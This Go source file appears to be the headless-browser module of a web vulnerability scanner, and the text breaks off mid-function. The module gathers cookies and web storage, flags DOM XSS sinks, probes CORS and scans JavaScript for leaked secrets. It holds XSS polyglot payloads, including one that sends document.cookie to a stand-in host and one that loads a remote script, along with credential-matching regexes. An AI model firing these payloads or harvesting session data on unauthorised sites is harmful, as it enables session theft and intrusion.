package browser

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/aydocs/fang/internal/engine"
	fanghttp "github.com/aydocs/fang/internal/http"
	"github.com/aydocs/fang/pkg/models"

	"github.com/chromedp/cdproto/dom"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"
)

type BrowserModule struct {
	cfg          *engine.Config
	client       *fanghttp.Client
	chromeCtx    context.Context
	chromeCancel context.CancelFunc
	hasChrome    bool
}

type browserConfig struct {
	headless  bool
	userAgent string
	viewportW int64
	viewportH int64
	timeout   time.Duration
	proxy     string
}

var sensitivePatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?:api[_-]?key|apikey)\s*[:=]\s*["']?([a-zA-Z0-9_\-]{16,})["']?`),
	regexp.MustCompile(`(?:secret|token)\s*[:=]\s*["']?([a-zA-Z0-9_\-\.]{16,})["']?`),
	regexp.MustCompile(`(?:aws_access_key_id|aws_secret_access_key)\s*[:=]\s*["']?([^"']+)["']?`),
	regexp.MustCompile(`(?:ghp|gho|ghu|ghs|ghr)_[a-zA-Z0-9]{36}`),
	regexp.MustCompile(`(?:sk_live|pk_live)_[a-zA-Z0-9]{24,}`),
	regexp.MustCompile(`(?:AIza[0-9A-Za-z\-_]{35})`),
	regexp.MustCompile(`(?:xox[bpsar]-[a-zA-Z0-9\-]{10,})`),
	regexp.MustCompile(`-----BEGIN (?:RSA |EC )?PRIVATE KEY-----`),
	regexp.MustCompile(`(?:password|passwd|pwd)\s*[:=]\s*["']?([^"'&\s]{8,})["']?`),
}

var vulnJSLibs = map[string][]string{
	"jquery":    {"1.0.0", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.1.4", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.6", "1.3.0", "1.3.1", "1.3.2", "1.4.0", "1.4.1", "1.4.2", "1.4.3", "1.4.4", "1.5.0", "1.5.1", "1.5.2", "1.6.0", "1.6.1", "1.6.2", "1.6.3", "1.6.4", "1.7.0", "1.7.1", "1.7.2", "1.8.0", "1.8.1", "1.8.2", "1.8.3", "1.9.0", "1.9.1", "1.10.0", "1.10.1", "1.10.2", "1.11.0", "1.11.1", "1.11.2", "1.11.3", "1.12.0", "1.12.1", "1.12.2", "1.12.3", "1.12.4"},
	"angular":   {"1.0.0", "1.0.1", "1.0.2", "1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7", "1.0.8", "1.1.0", "1.1.1", "1.1.2", "1.1.3", "1.1.4", "1.1.5", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5", "1.2.6", "1.2.7", "1.2.8", "1.2.9", "1.2.10", "1.2.11", "1.2.12", "1.2.13", "1.2.14", "1.2.15", "1.2.16", "1.2.17", "1.2.18", "1.2.19", "1.2.20", "1.2.21", "1.2.22", "1.2.23", "1.2.24", "1.2.25", "1.2.26", "1.2.27", "1.2.28", "1.2.29", "1.2.30", "1.2.31", "1.2.32"},
	"lodash":    {"4.17.4", "4.17.3", "4.17.2", "4.17.1", "4.17.0", "4.16.6", "4.16.5", "4.16.4", "4.16.3", "4.16.2", "4.16.1", "4.16.0", "4.15.0", "4.14.2", "4.14.1", "4.14.0", "4.13.1", "4.13.0", "4.12.0", "4.11.2", "4.11.1", "4.11.0", "4.10.0", "4.9.0", "4.8.2", "4.8.1", "4.8.0", "4.7.0", "4.6.1", "4.6.0", "4.5.1", "4.5.0", "4.4.0", "4.3.0", "4.2.1", "4.2.0", "4.1.0", "4.0.1", "4.0.0", "3.10.1", "3.10.0", "3.9.3", "3.9.2", "3.9.1", "3.9.0", "3.8.0", "3.7.0", "3.6.0", "3.5.0", "3.4.0"},
	"vue":       {"2.0.0", "2.0.1", "2.0.2", "2.0.3", "2.0.4", "2.0.5", "2.0.6", "2.0.7", "2.0.8", "2.1.0", "2.1.1", "2.1.2", "2.1.3", "2.1.4", "2.1.5", "2.1.6", "2.1.7", "2.1.8", "2.1.9", "2.1.10", "2.2.0", "2.2.1", "2.2.2", "2.2.3", "2.2.4", "2.2.5", "2.2.6", "2.3.0", "2.3.1", "2.3.2", "2.3.3", "2.3.4", "2.4.0", "2.4.1", "2.4.2", "2.4.3", "2.4.4", "2.5.0", "2.5.1", "2.5.2", "2.5.3", "2.5.4", "2.5.5", "2.5.6", "2.5.7", "2.5.8", "2.5.9", "2.5.10"},
	"react":     {"0.14.0", "0.14.1", "0.14.2", "0.14.3", "0.14.4", "0.14.5", "0.14.6", "0.14.7", "0.14.8", "15.0.0", "15.0.1", "15.0.2", "15.1.0", "15.2.0", "15.2.1", "15.3.0", "15.3.1", "15.3.2", "15.4.0", "15.4.1", "15.4.2", "15.5.0", "15.5.1", "15.5.2", "15.5.3", "15.5.4", "15.6.0", "15.6.1", "15.6.2", "16.0.0", "16.1.0", "16.1.1", "16.2.0", "16.2.1", "16.3.0", "16.3.1", "16.3.2", "16.4.0", "16.4.1", "16.4.2", "16.5.0", "16.5.1", "16.5.2", "16.6.0", "16.6.1", "16.6.2", "16.6.3", "16.7.0"},
	"bootstrap": {"3.0.0", "3.0.1", "3.0.2", "3.0.3", "3.1.0", "3.1.1", "3.2.0", "3.3.0", "3.3.1", "3.3.2", "3.3.4", "3.3.5", "3.3.6", "3.3.7", "4.0.0", "4.1.0", "4.1.1", "4.1.2", "4.1.3", "4.2.1", "4.3.0", "4.3.1", "4.4.0"},
	"moment":    {"2.0.0", "2.1.0", "2.2.0", "2.2.1", "2.3.0", "2.3.1", "2.4.0", "2.5.0", "2.5.1", "2.6.0", "2.7.0", "2.8.0", "2.8.1", "2.8.2", "2.8.3", "2.8.4", "2.9.0", "2.10.0", "2.10.1", "2.10.2", "2.10.3", "2.10.5", "2.10.6", "2.11.0", "2.11.1", "2.11.2", "2.12.0", "2.13.0", "2.14.0", "2.14.1", "2.15.0", "2.15.1", "2.15.2", "2.16.0", "2.17.0", "2.17.1", "2.18.0", "2.18.1", "2.19.0", "2.19.1", "2.19.2", "2.19.3", "2.19.4", "2.20.0", "2.20.1", "2.21.0", "2.22.0", "2.22.1", "2.22.2", "2.23.0", "2.24.0", "2.25.0", "2.25.1", "2.25.2", "2.25.3", "2.26.0", "2.27.0", "2.28.0", "2.29.0"},
}

func (m *BrowserModule) ID() string   { return "browser" }
func (m *BrowserModule) Name() string { return "Headless Browser & Client-Side Module" }
func (m *BrowserModule) Description() string {
	return "DOM XSS, postMessage leaks, WebSocket hijacking, WASM analysis, CORS, clickjacking, CSP eval"
}
func (m *BrowserModule) Severity() models.Severity { return models.High }

func (m *BrowserModule) Init(ctx context.Context, cfg *engine.Config) error {
	m.cfg = cfg
	m.client = fanghttp.NewClient(fanghttp.WithTimeout(cfg.Timeout))

	allocOpts := []chromedp.ExecAllocatorOption{
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.Flag("disable-background-networking", true),
		chromedp.Flag("disable-background-timer-throttling", true),
		chromedp.Flag("disable-backgrounding-occluded-windows", true),
		chromedp.Flag("disable-breakpad", true),
		chromedp.Flag("disable-client-side-phishing-detection", true),
		chromedp.Flag("disable-default-apps", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-extensions", true),
		chromedp.Flag("disable-features", "site-per-process"),
		chromedp.Flag("disable-hang-monitor", true),
		chromedp.Flag("disable-ipc-flooding-protection", true),
		chromedp.Flag("disable-popup-blocking", true),
		chromedp.Flag("disable-prompt-on-repost", true),
		chromedp.Flag("disable-renderer-backgrounding", true),
		chromedp.Flag("disable-sync", true),
		chromedp.Flag("disable-translate", true),
		chromedp.Flag("hide-scrollbars", true),
		chromedp.Flag("metrics-recording-only", true),
		chromedp.Flag("mute-audio", true),
		chromedp.Flag("no-sandbox", true),
	}

	bCfg := m.browserConfig()
	if bCfg.headless {
		allocOpts = append(allocOpts, chromedp.Flag("headless", true))
	} else {
		allocOpts = append(allocOpts, chromedp.Flag("headless", false))
	}
	if bCfg.userAgent != "" {
		allocOpts = append(allocOpts, chromedp.UserAgent(bCfg.userAgent))
	}
	if bCfg.proxy != "" {
		allocOpts = append(allocOpts, chromedp.ProxyServer(bCfg.proxy))
	}

	allocCtx, allocCancel := chromedp.NewExecAllocator(context.Background(), allocOpts...)
	chromeCtx, chromeCancel := chromedp.NewContext(allocCtx)

	ctxTimed, cancel := context.WithTimeout(chromeCtx, 15*time.Second)
	defer cancel()

	err := chromedp.Run(ctxTimed, chromedp.Tasks{
		chromedp.ActionFunc(func(ctx context.Context) error {
			return nil
		}),
	})
	if err != nil {
		allocCancel()
		chromeCancel()
		m.hasChrome = false
		return nil
	}

	m.hasChrome = true
	m.chromeCtx = chromeCtx
	m.chromeCancel = chromeCancel
	return nil
}

func (m *BrowserModule) browserConfig() browserConfig {
	return browserConfig{
		headless:  true,
		userAgent: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		viewportW: 1920,
		viewportH: 1080,
		timeout:   m.cfg.Timeout,
		proxy:     m.cfg.Proxy,
	}
}

func (m *BrowserModule) Scan(ctx context.Context, target *models.Target) ([]*models.Finding, error) {
	var findings []*models.Finding
	var mu sync.Mutex
	addF := func(fs ...*models.Finding) {
		mu.Lock()
		findings = append(findings, fs...)
		mu.Unlock()
	}

	if m.hasChrome {
		fs := m.scanWithChrome(ctx, target)
		addF(fs...)
	}

	fs := m.scanHTTP(ctx, target)
	addF(fs...)

	return findings, nil
}

func (m *BrowserModule) scanWithChrome(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	ctxTimed, cancel := context.WithTimeout(m.chromeCtx, m.cfg.Timeout)
	defer cancel()

	var pageSource string
	var screenshotBuf []byte
	var cookies []*network.Cookie
	var localStorage []string
	var sessionStorage []string
	var frameBusting bool

	netHeaders := make(network.Headers)
	for k, v := range target.Headers {
		netHeaders[k] = v
	}

	domXSSChecks := []string{
		`document.write(`, `document.writeln(`, `innerHTML=`,
		`outerHTML=`, `insertAdjacentHTML(`, `eval(`, `setTimeout(`,
		`setInterval(`, `new Function(`, `location.href=`,
		`location.hash=`, `location.search=`, `location.pathname=`,
		`document.cookie=`, `window.name`, `postMessage(`,
		`onmessage=`, `addEventListener('message`,
	}

	polyglotPayloads := []string{
		`\x22\x3E\x3Csvg+onload=alert(1)\x3E`,
		`"><svg onload=fetch('//xss.fang/'+document.cookie)>`,
		`'"><img src=x onerror=eval(atob('YWxlcnQoMSk'))>`,
		`javascript:/*--></title></style></textarea></script><svg onload=alert(1)>`,
		`"onmouseover="alert(1) `,
		`<data value="&lt;img src=x onerror=alert(1)&gt;">`,
		`{{constructor.constructor('alert(1)')()}}`,
		`<script>$.getScript('//xss.fang/x.js')</script>`,
	}

	navigateErr := chromedp.Run(ctxTimed, chromedp.Tasks{
		network.Enable(),
		network.SetExtraHTTPHeaders(netHeaders),
		chromedp.Navigate(target.URL),
		chromedp.WaitReady("body"),
		chromedp.Sleep(2 * time.Second),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			doc, dErr := dom.GetDocument().Do(pCtx)
			if dErr != nil {
				return dErr
			}
			html, hErr := dom.GetOuterHTML().WithNodeID(doc.NodeID).Do(pCtx)
			if hErr != nil {
				return hErr
			}
			pageSource = html
			return nil
		}),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			buf, sErr := page.CaptureScreenshot().WithFormat(page.CaptureScreenshotFormatPng).Do(pCtx)
			if sErr != nil {
				return sErr
			}
			screenshotBuf = buf
			return nil
		}),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			cks, cErr := network.GetCookies().Do(pCtx)
			if cErr != nil {
				return cErr
			}
			cookies = cks
			return nil
		}),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			jsCode := `JSON.stringify({localStorage: Object.entries(localStorage).map(function(kv){return kv[0]+'='+kv[1];}), sessionStorage: Object.entries(sessionStorage).map(function(kv){return kv[0]+'='+kv[1];})})`
			result, _, eErr := runtime.Evaluate(jsCode).Do(pCtx)
			if eErr != nil || result == nil {
				return nil
			}
			if result.Type != "string" || result.Value == nil {
				return nil
			}
			var val string
			if uErr := json.Unmarshal(result.Value, &val); uErr != nil {
				return nil
			}
			var store struct {
				LocalStorage   []string `json:"localStorage"`
				SessionStorage []string `json:"sessionStorage"`
			}
			if uErr := json.Unmarshal([]byte(val), &store); uErr == nil {
				localStorage = store.LocalStorage
				sessionStorage = store.SessionStorage
			}
			return nil
		}),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			jsCode := `(function(){try{var b=false;if(window.top!==window.self){b=true}try{if(top.location.hostname!==self.location.hostname){b=true}}catch(e){b=true}return JSON.stringify({fb:b})}catch(e){return JSON.stringify({fb:false})})()`
			result, _, eErr := runtime.Evaluate(jsCode).Do(pCtx)
			if eErr != nil || result == nil || result.Value == nil {
				return nil
			}
			var val string
			if uErr := json.Unmarshal(result.Value, &val); uErr != nil {
				return nil
			}
			var fb struct {
				FB bool `json:"fb"`
			}
			if uErr := json.Unmarshal([]byte(val), &fb); uErr == nil {
				frameBusting = fb.FB
			}
			return nil
		}),
		chromedp.ActionFunc(func(pCtx context.Context) error {
			jsCode := `JSON.stringify(Array.from(document.querySelectorAll('form')).map(function(f){return{action:f.action||'',method:f.method||'GET',inputs:Array.from(f.querySelectorAll('input,textarea,select')).map(function(i){return{name:i.name,type:i.type,value:i.value,autocomplete:i.autocomplete||''}})}}))`
			result, _, eErr := runtime.Evaluate(jsCode).Do(pCtx)
			if eErr != nil || result == nil || result.Value == nil {
				return nil
			}
			return nil
		}),
	})
	if navigateErr != nil {
		return findings
	}

	if len(screenshotBuf) > 0 {
		findings = append(findings, &models.Finding{
			Title:       "Browser - Screenshot Captured",
			Severity:    models.Info,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("Screenshot captured (%d bytes)", len(screenshotBuf)),
			Description: "Screenshot of the page captured for visual verification.",
			Remediation: "Review screenshot for sensitive information exposure.",
			CWEID:       "CWE-200",
			ModuleID:    "browser",
			Extra: map[string]string{
				"screenshot_size": fmt.Sprintf("%d", len(screenshotBuf)),
			},
		})
	}

	if len(cookies) > 0 {
		var cookieDetails []string
		var insecureCookies []string
		for _, c := range cookies {
			detail := fmt.Sprintf("%s=%s (domain=%s, path=%s, secure=%v, httpOnly=%v, samesite=%s)",
				c.Name, c.Value, c.Domain, c.Path, c.Secure, c.HTTPOnly, c.SameSite)
			cookieDetails = append(cookieDetails, detail)
			if !c.Secure {
				insecureCookies = append(insecureCookies, c.Name)
			}
		}
		findings = append(findings, &models.Finding{
			Title:       "Browser - Cookies Extracted",
			Severity:    models.Info,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("Found %d cookies: %s", len(cookies), strings.Join(cookieDetails, "; ")),
			Description: fmt.Sprintf("Extracted %d cookies from the browser context.", len(cookies)),
			Remediation: "Ensure all cookies have Secure and HttpOnly flags where appropriate. Use SameSite=Lax or Strict.",
			CWEID:       "CWE-200",
			ModuleID:    "browser",
		})
		if len(insecureCookies) > 0 {
			findings = append(findings, &models.Finding{
				Title:       "Browser - Insecure Cookies Detected",
				Severity:    models.Medium,
				Confidence:  models.HighConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Cookies without Secure flag: %s", strings.Join(insecureCookies, ", ")),
				Description: "Cookies without the Secure flag can be transmitted over unencrypted HTTP connections.",
				Remediation: "Set the Secure flag on all cookies to ensure they are only sent over HTTPS.",
				CWEID:       "CWE-614",
				ModuleID:    "browser",
			})
		}
	}

	if len(localStorage) > 0 {
		findings = append(findings, &models.Finding{
			Title:       "Browser - localStorage Data Extracted",
			Severity:    models.Medium,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("localStorage items: %s", strings.Join(localStorage, ", ")),
			Description: "The page stores data in localStorage, which is accessible via JavaScript and vulnerable to XSS.",
			Remediation: "Avoid storing sensitive data in localStorage. Use httpOnly cookies for authentication tokens.",
			CWEID:       "CWE-312",
			ModuleID:    "browser",
		})
	}

	if len(sessionStorage) > 0 {
		findings = append(findings, &models.Finding{
			Title:       "Browser - sessionStorage Data Extracted",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Evidence:    fmt.Sprintf("sessionStorage items: %s", strings.Join(sessionStorage, ", ")),
			Description: "The page stores data in sessionStorage, which is accessible via JavaScript and vulnerable to XSS.",
			Remediation: "Avoid storing sensitive data in sessionStorage. Use httpOnly cookies for authentication tokens.",
			CWEID:       "CWE-312",
			ModuleID:    "browser",
		})
	}

	if !frameBusting && pageSource != "" {
		findings = append(findings, &models.Finding{
			Title:       "Browser - Clickjacking Vulnerability (No Frame Busting)",
			Severity:    models.High,
			Confidence:  models.MediumConfidence,
			URL:         target.URL,
			Evidence:    "Page does not implement frame-busting JavaScript or X-Frame-Options header",
			Description: "The page can be loaded in an iframe, making it vulnerable to clickjacking attacks.",
			Remediation: "Implement X-Frame-Options: DENY header or Content-Security-Policy: frame-ancestors 'none'.",
			CWEID:       "CWE-1021",
			ModuleID:    "browser",
		})
	}

	if pageSource != "" {
		for _, marker := range domXSSChecks {
			if strings.Contains(pageSource, marker) {
				findings = append(findings, &models.Finding{
					Title:       "Browser - DOM XSS Sink Detected",
					Severity:    models.High,
					Confidence:  models.MediumConfidence,
					URL:         target.URL,
					Evidence:    fmt.Sprintf("DOM XSS sink found: %s", marker),
					Description: fmt.Sprintf("The page contains a DOM XSS sink '%s'. If user input flows into this sink, it can lead to DOM-based XSS.", marker),
					Remediation: "Avoid using dangerous DOM APIs with user input. Use safe APIs like textContent instead of innerHTML.",
					CWEID:       "CWE-79",
					ModuleID:    "browser",
				})
			}
		}
	}

	for _, payload := range polyglotPayloads {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		payloadCtx, payloadCancel := context.WithTimeout(m.chromeCtx, 10*time.Second)
		chromedp.Run(payloadCtx, chromedp.Tasks{
			chromedp.Navigate(target.URL),
			chromedp.WaitReady("body"),
			chromedp.ActionFunc(func(pCtx context.Context) error {
				jsCode := fmt.Sprintf(`try { document.body.innerHTML = document.body.innerHTML + %s; } catch(e) {}`, payload)
				result, _, eErr := runtime.Evaluate(jsCode).Do(pCtx)
				_ = result
				_ = eErr
				return nil
			}),
		})
		payloadCancel()
	}

	if pageSource != "" {
		jsFiles := extractJSFiles(pageSource)
		for _, jsFile := range jsFiles {
			select {
			case <-ctx.Done():
				return findings
			default:
			}

			jsURL := resolveURL(target.URL, jsFile)
			if jsURL == "" {
				continue
			}

			jsResp, gErr := m.client.Get(jsURL)
			if gErr != nil {
				continue
			}

			jsContent := jsResp.Body

			for _, pat := range sensitivePatterns {
				matches := pat.FindAllString(jsContent, -1)
				for _, match := range matches {
					findings = append(findings, &models.Finding{
						Title:       "Browser - Sensitive Data in JavaScript",
						Severity:    models.Critical,
						Confidence:  models.HighConfidence,
						URL:         jsURL,
						Evidence:    fmt.Sprintf("Pattern matched: %s", truncate(match, 60)),
						Description: "Potential sensitive data (API key, token, secret) found in JavaScript file.",
						Remediation: "Remove sensitive data from client-side code. Use server-side proxies for API access.",
						CWEID:       "CWE-798",
						ModuleID:    "browser",
					})
				}
			}

			libVersion := detectLibraryVersion(jsContent, jsURL)
			if libVersion != "" {
				findings = append(findings, &models.Finding{
					Title:       "Browser - JavaScript Library Detected",
					Severity:    models.Info,
					Confidence:  models.HighConfidence,
					URL:         jsURL,
					Evidence:    fmt.Sprintf("Library version: %s", libVersion),
					Description: fmt.Sprintf("Detected JavaScript library version in %s.", libVersion),
					Remediation: "Keep JavaScript libraries updated to the latest versions.",
					CWEID:       "CWE-1104",
					ModuleID:    "browser",
				})
			}

			vulnCheck := checkVulnerableLibrary(jsURL, libVersion)
			if vulnCheck != "" {
				findings = append(findings, &models.Finding{
					Title:       "Browser - Vulnerable JavaScript Library",
					Severity:    models.High,
					Confidence:  models.HighConfidence,
					URL:         jsURL,
					Evidence:    vulnCheck,
					Description: fmt.Sprintf("Vulnerable JavaScript library detected: %s", vulnCheck),
					Remediation: "Update the vulnerable library to a patched version immediately.",
					CWEID:       "CWE-1104",
					ModuleID:    "browser",
				})
			}
		}
	}

	if pageSource != "" {
		cspHeader := extractCSP(pageSource)
		if cspHeader != "" {
			findings = append(findings, evaluateCSP(cspHeader, target.URL)...)
		}
	}

	if pageSource != "" {
		spaRoutes := detectSPARoutes(pageSource)
		if len(spaRoutes) > 0 {
			findings = append(findings, &models.Finding{
				Title:       "Browser - SPA Routes / Hidden Endpoints Detected",
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Potential SPA routes: %s", strings.Join(spaRoutes, ", ")),
				Description: "Detected potential SPA routes and hidden endpoints that may represent additional attack surface.",
				Remediation: "Ensure all routes implement proper authentication and authorization.",
				CWEID:       "CWE-200",
				ModuleID:    "browser",
			})
		}
	}

	if pageSource != "" {
		autofillFields := detectAutofill(pageSource)
		if len(autofillFields) > 0 {
			findings = append(findings, &models.Finding{
				Title:       "Browser - Form Autofill Detected",
				Severity:    models.Low,
				Confidence:  models.MediumConfidence,
				URL:         target.URL,
				Evidence:    fmt.Sprintf("Fields with autocomplete: %s", strings.Join(autofillFields, ", ")),
				Description: "Form fields have autocomplete enabled, which may expose sensitive data in shared browser environments.",
				Remediation: "Set autocomplete='off' on sensitive form fields, especially password fields.",
				CWEID:       "CWE-200",
				ModuleID:    "browser",
			})
		}
	}

	if target.URL != "" {
		findings = append(findings, m.checkCORS(ctx, target.URL)...)
	}

	if pageSource != "" {
		findings = append(findings, m.checkLegacyFeatures(pageSource, target.URL)...)
	}

	return findings
}

func (m *BrowserModule) checkCORS(ctx context.Context, targetURL string) []*models.Finding {
	var findings []*models.Finding

	testOrigins := []struct {
		origin string
		name   string
	}{
		{"https://evil.fangtest.com", "Arbitrary Origin"},
		{"null", "Null Origin"},
	}

	for _, to := range testOrigins {
		req := fanghttp.NewRequest("GET", targetURL)
		req.Headers["Origin"] = to.origin
		resp, rErr := m.client.Do(req)
		if rErr != nil {
			continue
		}

		acao := resp.Headers.Get("Access-Control-Allow-Origin")
		if acao == to.origin || acao == "*" {
			findings = append(findings, &models.Finding{
				Title:       "Browser - CORS Misconfiguration",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Origin '%s' reflected in Access-Control-Allow-Origin header", to.origin),
				Description: fmt.Sprintf("CORS misconfiguration detected: server reflects '%s' origin in Access-Control-Allow-Origin.", to.name),
				Remediation: "Configure CORS to only allow specific trusted origins. Do not use origin reflection or wildcard '*' with credentials.",
				CWEID:       "CWE-942",
				ModuleID:    "browser",
			})
		}

		acac := resp.Headers.Get("Access-Control-Allow-Credentials")
		if acao == to.origin && acac == "true" {
			findings = append(findings, &models.Finding{
				Title:       "Browser - CORS with Credentials Enabled",
				Severity:    models.Critical,
				Confidence:  models.HighConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("Access-Control-Allow-Origin: %s, Access-Control-Allow-Credentials: true", to.origin),
				Description: "CORS misconfiguration allows cross-origin requests with credentials.",
				Remediation: "Disable Access-Control-Allow-Credentials or ensure specific origin whitelist is used.",
				CWEID:       "CWE-942",
				ModuleID:    "browser",
			})
		}
	}

	return findings
}

func (m *BrowserModule) checkLegacyFeatures(pageSource, targetURL string) []*models.Finding {
	var findings []*models.Finding

	if strings.Contains(pageSource, "postMessage") || strings.Contains(pageSource, "addEventListener('message") {
		findings = append(findings, &models.Finding{
			Title:       "Browser - postMessage API Used",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         targetURL,
			Evidence:    "window.postMessage or addEventListener detected in page scripts",
			Description: "Page uses postMessage API. Without proper origin validation, this can lead to cross-origin data leakage.",
			Remediation: "Always validate event.origin in postMessage handlers. Avoid using postMessage with targetOrigin '*'.",
			CWEID:       "CWE-345",
			ModuleID:    "browser",
		})
	}

	if strings.Contains(pageSource, "WebSocket") || strings.Contains(strings.ToLower(pageSource), "new WebSocket") {
		wsEndpoints := extractWebSocketEndpoints(pageSource)
		for _, ws := range wsEndpoints {
			findings = append(findings, &models.Finding{
				Title:       "Browser - WebSocket Connection Found",
				Severity:    models.Medium,
				Confidence:  models.MediumConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("WebSocket endpoint: %s", ws),
				Description: fmt.Sprintf("WebSocket connection to %s detected. WebSockets can be vulnerable to CSWSH.", ws),
				Remediation: "Validate Origin header on WebSocket upgrade. Use tokens for WebSocket authentication.",
				CWEID:       "CWE-1385",
				ModuleID:    "browser",
			})
		}
	}

	if strings.Contains(pageSource, ".wasm") || strings.Contains(pageSource, "WebAssembly") {
		findings = append(findings, &models.Finding{
			Title:       "Browser - WebAssembly Module Detected",
			Severity:    models.Low,
			Confidence:  models.MediumConfidence,
			URL:         targetURL,
			Evidence:    "WebAssembly module referenced in page",
			Description: "Page loads WebAssembly modules. WASM can obfuscate malicious logic or hide API endpoints.",
			Remediation: "Implement Content-Security-Policy with wasm-unsafe-eval if needed. Audit WASM modules for backdoors.",
			CWEID:       "CWE-1104",
			ModuleID:    "browser",
		})
	}

	if strings.Contains(pageSource, "__VIEWSTATE") {
		findings = append(findings, &models.Finding{
			Title:       "Browser - ASP.NET ViewState Detected",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         targetURL,
			Evidence:    "ASP.NET ViewState field detected",
			Description: "ASP.NET ViewState is present. If not encrypted/MAC-protected, it can be tampered with for deserialization attacks.",
			Remediation: "Enable ViewStateMac and ViewStateEncryption. Use machineKey with proper encryption.",
			CWEID:       "CWE-502",
			ModuleID:    "browser",
		})
	}

	return findings
}

func (m *BrowserModule) scanHTTP(ctx context.Context, target *models.Target) []*models.Finding {
	var findings []*models.Finding

	resp, err := m.client.Get(target.URL)
	if err != nil {
		return nil
	}

	body := resp.Body

	if resp.Headers.Get("X-Frame-Options") == "" {
		findings = append(findings, &models.Finding{
			Title:       "Browser - X-Frame-Options Missing",
			Severity:    models.Medium,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    "X-Frame-Options header is not set",
			Description: "X-Frame-Options header is missing, making the page vulnerable to clickjacking attacks.",
			Remediation: "Set X-Frame-Options: DENY or SAMEORIGIN to prevent clickjacking.",
			CWEID:       "CWE-1021",
			ModuleID:    "browser",
		})
	}

	cspHeader := resp.Headers.Get("Content-Security-Policy")
	if cspHeader != "" {
		findings = append(findings, evaluateCSP(cspHeader, target.URL)...)
	} else {
		findings = append(findings, &models.Finding{
			Title:       "Browser - Content-Security-Policy Missing (HTTP)",
			Severity:    models.Medium,
			Confidence:  models.HighConfidence,
			URL:         target.URL,
			Evidence:    "No Content-Security-Policy header found in HTTP response",
			Description: "The server does not send a Content-Security-Policy header, increasing XSS risk.",
			Remediation: "Implement a strict Content-Security-Policy header.",
			CWEID:       "CWE-693",
			ModuleID:    "browser",
		})
	}

	sourceMaps := findSourceMaps(body)
	for _, sm := range sourceMaps {
		mapURL := resolveURL(target.URL, sm)
		if mapURL != "" {
			mapResp, mErr := m.client.Get(mapURL)
			if mErr == nil && mapResp.StatusCode == 200 {
				findings = append(findings, &models.Finding{
					Title:       "Browser - Source Map Exposed",
					Severity:    models.Low,
					Confidence:  models.HighConfidence,
					URL:         mapURL,
					Evidence:    fmt.Sprintf("Source map accessible: %s (%d bytes)", sm, len(mapResp.Body)),
					Description: fmt.Sprintf("JavaScript source map file exposed at %s. Source maps can reveal original source code, API keys, and internal logic.", sm),
					Remediation: "Remove source maps from production. Configure web server to deny .map files.",
					CWEID:       "CWE-200",
					ModuleID:    "browser",
				})
			}
		}
	}

	return findings
}

func extractCSP(source string) string {
	re := regexp.MustCompile(`<meta[^>]*http-equiv=["']Content-Security-Policy["'][^>]*content=["']([^"']+)["']`)
	if matches := re.FindStringSubmatch(source); len(matches) > 1 {
		return matches[1]
	}
	return ""
}

func evaluateCSP(csp, targetURL string) []*models.Finding {
	var findings []*models.Finding
	directives := parseCSP(csp)

	if val, ok := directives["script-src"]; ok {
		if strings.Contains(val, "'unsafe-inline'") {
			findings = append(findings, &models.Finding{
				Title:       "Browser - CSP Weakness: unsafe-inline in script-src",
				Severity:    models.High,
				Confidence:  models.HighConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("CSP script-src includes unsafe-inline: %s", val),
				Description: "CSP allows unsafe-inline scripts, which weakens XSS protection.",
				Remediation: "Remove 'unsafe-inline' from script-src. Use nonces or hashes for inline scripts.",
				CWEID:       "CWE-693",
				ModuleID:    "browser",
			})
		}
		if strings.Contains(val, "'unsafe-eval'") {
			findings = append(findings, &models.Finding{
				Title:       "Browser - CSP Weakness: unsafe-eval in script-src",
				Severity:    models.Medium,
				Confidence:  models.HighConfidence,
				URL:         targetURL,
				Evidence:    fmt.Sprintf("CSP script-src includes unsafe-eval: %s", val),
				Description: "CSP allows eval() and similar functions, increasing XSS risk.",
				Remediation: "Remove 'unsafe-eval' from script-src if possible.",
				CWEID:       "CWE-693",
				ModuleID:    "browser",
			})
		}
	} else if _, ok := directives["default-src"]; !ok {
		findings = append(findings, &models.Finding{
			Title:       "Browser - CSP Missing script-src Directive",
			Severity:    models.Medium,
			Confidence:  models.MediumConfidence,
			URL:         targetURL,
			Evidence:    "CSP header does not include script-src or default-src directive",
			Description: "CSP policy does not restrict script sources, making it less effective against XSS.",
			Remediation: "Add a script-src directive to CSP to restrict allowed script sources.",
			CWEID:       "CWE-693",
			ModuleID:    "browser",
		})
	}

	if val, ok := directives["object-src"]; ok {
